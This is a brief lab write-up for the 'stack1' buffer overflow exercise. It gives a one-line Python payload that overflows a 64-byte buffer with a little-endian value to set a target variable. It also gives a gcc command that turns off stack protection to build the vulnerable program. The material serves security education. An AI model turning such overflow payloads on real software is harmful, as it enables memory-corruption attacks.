#Stack 1

Similar to fist one except it requires to change it to a specific value

```
./stack1 $(python -c 'print "A" * 64 + "\x64\x63\x62\x61"')
```

Notes:

* Little endian!!
* gcc -g -fno-stack-protector -D_FORTIFY_SOURCE=0 -o (executable_file_name) (.c file) to compile the source code in mac (disabling stack canaray and stack protection)
